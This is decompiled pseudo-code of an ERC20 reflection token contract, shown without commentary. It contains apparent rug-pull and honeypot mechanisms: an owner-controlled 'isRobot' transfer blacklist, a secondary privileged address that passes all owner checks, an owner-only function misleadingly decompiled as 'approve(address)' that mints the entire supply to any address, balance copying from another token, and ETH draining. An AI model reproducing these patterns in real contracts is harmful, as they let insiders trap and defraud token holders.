contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
const getTime = block.timestamp


address _owner;
address stor1;
mapping of uint256 stor2;
mapping of uint256 allowance;
mapping of address inviter;
mapping of uint8 stor7;
mapping of uint8 stor8;
mapping of uint8 stor9;
uint256 totalSupply;
uint256 stor11;
uint256 totalFees;
uint8 stor13;
uint8 stor13; offset 8
uint256 stor13; offset 8
array of struct stor14;
array of struct stor15;
uint256 decimals;
uint256 _liquidityFee;
uint256 _destroyFee;
address uniswapV2PairAddress;

function totalFees() {
    return totalFees
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function uniswapV2Pair() {
    return uniswapV2PairAddress
}

function isExcludedFromFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor7[address(arg1)])
}

function _liquidityFee() {
    return _liquidityFee
}

function pause() {
    return bool(uint8(stor13.field_0))
}

function owner() {
    return _owner
}

function sub_9582bdab(?) {
    return bool(uint8(stor13.field_8))
}

function _destroyFee() {
    return _destroyFee
}

function isRobot(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor8[address(arg1)])
}

function _owner() {
    return _owner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function inviter(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return inviter[arg1]
}

function _fallback() payable {
    revert
}

function sub_361b72c1(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    _destroyFee = arg1
}

function changeOwner(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    _owner = arg1
}

function sub_63eb0c1e(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    stor8[address(arg1)] = 0
}

function sub_d25c5af0(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    stor8[address(arg1)] = 1
}

function includeInFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    stor7[address(arg1)] = 0
}

function excludeFromFee(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    stor7[address(arg1)] = 1
}

function changeRouter(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    uniswapV2PairAddress = arg1
}

function changePause(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    uint8(stor13.field_0) = uint8(arg1)
}

function sub_d255be0b(?) {
    require calldata.size - 4 >= 32
    require arg1 == bool(arg1)
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor13.field_8) = Mask(248, 0, bool(arg1))
}

function sub_da88e86a(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == bool(arg2)
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    stor9[address(arg1)] = uint8(bool(arg2))
}

function claimTokens() {
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    call _owner with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function tokenFromReflection(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if arg1 > stor11:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if stor11 / totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor11 / totalSupply:
        revert with 'NH{q', 18
    return (arg1 / stor11 / totalSupply)
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if stor2[address(arg1)] > stor11:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if stor11 / totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not stor11 / totalSupply:
        revert with 'NH{q', 18
    return (stor2[address(arg1)] / stor11 / totalSupply)
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 32, 37, 0x6545524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572, mem[165 len 27] >> 40, 0
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function changeTokenName(string arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg1.length)) + 97 > test266151307() or ceil32(ceil32(arg1.length)) + 97 < 96:
        revert with 'NH{q', 65
    require arg1 + arg1.length + 36 <= calldata.size
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if bool(stor14.length):
        if bool(stor14.length) == stor14.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor14[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor14.length = 0
            idx = 0
            while stor14.length.field_1 + 31 / 32 > idx:
                stor14[idx].field_0 = 0
                idx = idx + 1
                continue 
    else:
        if bool(stor14.length) == stor14.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor14[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor14.length = 0
            idx = 0
            while stor14.length.field_1 + 31 / 32 > idx:
                stor14[idx].field_0 = 0
                idx = idx + 1
                continue 
}

function changeTokenSymbol(string arg1) {
    require calldata.size - 4 >= 32
    require arg1 <= test266151307()
    require arg1 + 35 < calldata.size
    if arg1.length > test266151307():
        revert with 'NH{q', 65
    if ceil32(ceil32(arg1.length)) + 97 > test266151307() or ceil32(ceil32(arg1.length)) + 97 < 96:
        revert with 'NH{q', 65
    require arg1 + arg1.length + 36 <= calldata.size
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if bool(stor15.length):
        if bool(stor15.length) == stor15.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor15[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor15.length = 0
            idx = 0
            while stor15.length.field_1 + 31 / 32 > idx:
                stor15[idx].field_0 = 0
                idx = idx + 1
                continue 
    else:
        if bool(stor15.length) == stor15.length.field_1 < 32:
            revert with 'NH{q', 34
        if arg1.length:
            stor15[].field_0 = Array(len=arg1.length, data=arg1[all])
        else:
            stor15.length = 0
            idx = 0
            while stor15.length.field_1 + 31 / 32 > idx:
                stor15[idx].field_0 = 0
                idx = idx + 1
                continue 
}

function approve(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if _owner != msg.sender:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
    if not decimals:
        totalSupply = 10^11
    else:
        if bool(bool(decimals < 78)) or bool(bool(decimals < 32)):
            if 10^decimals > -1:
                revert with 'NH{q', 17
            if 10^decimals > 0xafebff0bcb24aafef78f69a51539d748f2ff38ca3eda88b093e034f:
                revert with 'NH{q', 17
            totalSupply = 10^11 * 10^decimals
        else:
            s = 10
            t = 1
            idx = decimals
            while idx > 1:
                if s > -1 / s:
                    revert with 'NH{q', 17
                if not bool(idx):
                    s = s * s
                    t = t
                    idx = uint255(idx) * 0.5
                    continue 
                s = s * s
                t = t * s
                idx = uint255(idx) * 0.5
                continue 
            if t > -1 / s:
                revert with 'NH{q', 17
            if t * s > 0xafebff0bcb24aafef78f69a51539d748f2ff38ca3eda88b093e034f:
                revert with 'NH{q', 17
            totalSupply = 10^11 * t * s
    if not totalSupply:
        revert with 'NH{q', 18
    if -1 < -1 % totalSupply:
        revert with 'NH{q', 17
    stor11 = -(-1 % totalSupply) - 1
    stor2[address(arg1)] = stor11
    emit Transfer(totalSupply, 0, arg1);
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require not stor8[address(msg.sender)]
    if uniswapV2PairAddress != msg.sender:
        if stor2[address(arg1)] > stor11:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'Amount must be less than total reflections'
        if totalSupply <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply:
            revert with 'NH{q', 18
        if totalSupply <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not totalSupply:
            revert with 'NH{q', 18
        if stor11 / totalSupply <= 0:
            revert with 0, 'SafeMath: division by zero', 0
        if not stor11 / totalSupply:
            revert with 'NH{q', 18
        if not stor2[address(arg1)] / stor11 / totalSupply:
            if not inviter[address(arg1)]:
                inviter[address(arg1)] = msg.sender
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if totalSupply <= 0:
        revert with 0, 'SafeMath: division by zero', 0
    if not totalSupply:
        revert with 'NH{q', 18
    if not arg2:
        if 0 > stor2[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow', 0
        if stor2[address(msg.sender)] < 0:
            revert with 'NH{q', 17
        if stor2[address(arg1)] > -1:
            revert with 'NH{q', 17
        if stor2[address(arg1)] < stor2[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
    else:
        if arg2 and stor11 / totalSupply > -1 / arg2:
            revert with 'NH{q', 17
        if not arg2:
            revert with 'NH{q', 18
        if arg2 * stor11 / totalSupply / arg2 != stor11 / totalSupply:
            revert with 0, 'SafeMath: multiplication overflow'
        if arg2 * stor11 / totalSupply > stor2[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow', 0
        if stor2[address(msg.sender)] < arg2 * stor11 / totalSupply:
            revert with 'NH{q', 17
        stor2[address(msg.sender)] += -1 * arg2 * stor11 / totalSupply
        if stor2[address(arg1)] > (-1 * arg2 * stor11 / totalSupply) - 1:
            revert with 'NH{q', 17
        if stor2[address(arg1)] + (arg2 * stor11 / totalSupply) < stor2[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        stor2[address(arg1)] += arg2 * stor11 / totalSupply
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function name() {
    if bool(stor14.length):
        if bool(stor14.length) == stor14.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor14.length):
            if bool(stor14.length) == stor14.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor14.length.field_1:
                if 31 < stor14.length.field_1:
                    mem[128] = uint256(stor14.field_0)
                    idx = 128
                    s = 0
                    while stor14.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor14[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor14.length.field_1), data=mem[128 len ceil32(stor14.length.field_1)])
                mem[128] = 256 * stor14.length.field_8
        else:
            if bool(stor14.length) == stor14.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor14.length.field_1:
                if 31 < stor14.length.field_1:
                    mem[128] = uint256(stor14.field_0)
                    idx = 128
                    s = 0
                    while stor14.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor14[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor14.length.field_1), data=mem[128 len ceil32(stor14.length.field_1)])
                mem[128] = 256 * stor14.length.field_8
        mem[ceil32(stor14.length.field_1) + 192 len ceil32(stor14.length.field_1)] = mem[128 len ceil32(stor14.length.field_1)]
        if ceil32(stor14.length.field_1) > stor14.length.field_1:
            mem[ceil32(stor14.length.field_1) + stor14.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor14.length.field_1), data=mem[128 len ceil32(stor14.length.field_1)], mem[(2 * ceil32(stor14.length.field_1)) + 192 len 2 * ceil32(stor14.length.field_1)]), 
    if bool(stor14.length) == stor14.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor14.length):
        if bool(stor14.length) == stor14.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor14.length.field_1:
            if 31 < stor14.length.field_1:
                mem[128] = uint256(stor14.field_0)
                idx = 128
                s = 0
                while stor14.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor14[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor14.length % 128, data=mem[128 len ceil32(stor14.length.field_1)])
            mem[128] = 256 * stor14.length.field_8
    else:
        if bool(stor14.length) == stor14.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor14.length.field_1:
            if 31 < stor14.length.field_1:
                mem[128] = uint256(stor14.field_0)
                idx = 128
                s = 0
                while stor14.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor14[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor14.length % 128, data=mem[128 len ceil32(stor14.length.field_1)])
            mem[128] = 256 * stor14.length.field_8
    mem[ceil32(stor14.length.field_1) + 192 len ceil32(stor14.length.field_1)] = mem[128 len ceil32(stor14.length.field_1)]
    if ceil32(stor14.length.field_1) > stor14.length.field_1:
        mem[ceil32(stor14.length.field_1) + stor14.length.field_1 + 192] = 0
    return Array(len=stor14.length % 128, data=mem[128 len ceil32(stor14.length.field_1)], mem[(2 * ceil32(stor14.length.field_1)) + 192 len 2 * ceil32(stor14.length.field_1)]), 
}

function symbol() {
    if bool(stor15.length):
        if bool(stor15.length) == stor15.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor15.length):
            if bool(stor15.length) == stor15.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor15.length.field_1:
                if 31 < stor15.length.field_1:
                    mem[128] = uint256(stor15.field_0)
                    idx = 128
                    s = 0
                    while stor15.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor15[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor15.length.field_1), data=mem[128 len ceil32(stor15.length.field_1)])
                mem[128] = 256 * stor15.length.field_8
        else:
            if bool(stor15.length) == stor15.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor15.length.field_1:
                if 31 < stor15.length.field_1:
                    mem[128] = uint256(stor15.field_0)
                    idx = 128
                    s = 0
                    while stor15.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor15[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor15.length.field_1), data=mem[128 len ceil32(stor15.length.field_1)])
                mem[128] = 256 * stor15.length.field_8
        mem[ceil32(stor15.length.field_1) + 192 len ceil32(stor15.length.field_1)] = mem[128 len ceil32(stor15.length.field_1)]
        if ceil32(stor15.length.field_1) > stor15.length.field_1:
            mem[ceil32(stor15.length.field_1) + stor15.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor15.length.field_1), data=mem[128 len ceil32(stor15.length.field_1)], mem[(2 * ceil32(stor15.length.field_1)) + 192 len 2 * ceil32(stor15.length.field_1)]), 
    if bool(stor15.length) == stor15.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor15.length):
        if bool(stor15.length) == stor15.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor15.length.field_1:
            if 31 < stor15.length.field_1:
                mem[128] = uint256(stor15.field_0)
                idx = 128
                s = 0
                while stor15.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor15[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor15.length % 128, data=mem[128 len ceil32(stor15.length.field_1)])
            mem[128] = 256 * stor15.length.field_8
    else:
        if bool(stor15.length) == stor15.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor15.length.field_1:
            if 31 < stor15.length.field_1:
                mem[128] = uint256(stor15.field_0)
                idx = 128
                s = 0
                while stor15.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor15[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor15.length % 128, data=mem[128 len ceil32(stor15.length.field_1)])
            mem[128] = 256 * stor15.length.field_8
    mem[ceil32(stor15.length.field_1) + 192 len ceil32(stor15.length.field_1)] = mem[128 len ceil32(stor15.length.field_1)]
    if ceil32(stor15.length.field_1) > stor15.length.field_1:
        mem[ceil32(stor15.length.field_1) + stor15.length.field_1 + 192] = 0
    return Array(len=stor15.length % 128, data=mem[128 len ceil32(stor15.length.field_1)], mem[(2 * ceil32(stor15.length.field_1)) + 192 len 2 * ceil32(stor15.length.field_1)]), 
}

function sub_f27c192f(?) {
    require calldata.size - 4 >= 32
    require cd[4] <= test266151307()
    require cd[4] + 35 < calldata.size
    if ('cd', 4).length > test266151307():
        revert with 'NH{q', 65
    if floor32(('cd', 4).length) + 97 > test266151307() or floor32(('cd', 4).length) + 97 < 96:
        revert with 'NH{q', 65
    mem[64] = floor32(('cd', 4).length) + 97
    mem[96] = ('cd', 4).length
    require cd[4] + (32 * ('cd', 4).length) + 36 <= calldata.size
    idx = 0
    s = cd[4] + 36
    t = 128
    while idx < ('cd', 4).length:
        require cd[s] == address(cd[s])
        mem[t] = cd[s]
        idx = idx + 1
        s = s + 32
        t = t + 32
        continue 
    if _owner == msg.sender:
        if ('cd', 4).length > 0:
            idx = 1
            while idx < ('cd', 4).length:
                if idx >= mem[96]:
                    revert with 'NH{q', 50
                _74 = mem[(32 * idx) + 128]
                mem[mem[64] + 4] = mem[(32 * idx) + 140 len 20]
                require ext_code.size(0x1f75cf5953b320146cc75fdba2fa847265c6bb6f)
                staticcall 0x1f75cf5953b320146cc75fdba2fa847265c6bb6f.0x70a08231 with:
                        gas gas_remaining wei
                       args address(_74)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _80 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _82 = mem[_80]
                require mem[_80] == mem[_80]
                if mem[_80] > 0:
                    if idx >= mem[96]:
                        revert with 'NH{q', 50
                    if stor2[mem[(32 * idx) + 140 len 20]] > -mem[_80] - 1:
                        revert with 'NH{q', 17
                    if stor2[mem[(32 * idx) + 140 len 20]] + mem[_80] < stor2[mem[(32 * idx) + 140 len 20]]:
                        revert with 0, 'SafeMath: addition overflow'
                    if idx >= mem[96]:
                        revert with 'NH{q', 50
                    mem[0] = mem[(32 * idx) + 140 len 20]
                    mem[32] = 2
                    stor2[mem[(32 * idx) + 140 len 20]] += _82
                if idx == -1:
                    revert with 'NH{q', 17
                idx = idx + 1
                continue 
    else:
        if stor1 != msg.sender:
            revert with 0, 'Ownable: caller is not the owner'
        if ('cd', 4).length > 0:
            idx = 1
            while idx < ('cd', 4).length:
                if idx >= mem[96]:
                    revert with 'NH{q', 50
                _76 = mem[(32 * idx) + 128]
                mem[mem[64] + 4] = mem[(32 * idx) + 140 len 20]
                require ext_code.size(0x1f75cf5953b320146cc75fdba2fa847265c6bb6f)
                staticcall 0x1f75cf5953b320146cc75fdba2fa847265c6bb6f.0x70a08231 with:
                        gas gas_remaining wei
                       args address(_76)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _81 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _83 = mem[_81]
                require mem[_81] == mem[_81]
                if mem[_81] > 0:
                    if idx >= mem[96]:
                        revert with 'NH{q', 50
                    if stor2[mem[(32 * idx) + 140 len 20]] > -mem[_81] - 1:
                        revert with 'NH{q', 17
                    if stor2[mem[(32 * idx) + 140 len 20]] + mem[_81] < stor2[mem[(32 * idx) + 140 len 20]]:
                        revert with 0, 'SafeMath: addition overflow'
                    if idx >= mem[96]:
                        revert with 'NH{q', 50
                    mem[0] = mem[(32 * idx) + 140 len 20]
                    mem[32] = 2
                    stor2[mem[(32 * idx) + 140 len 20]] += _83
                if idx == -1:
                    revert with 'NH{q', 17
                idx = idx + 1
                continue 
}



}
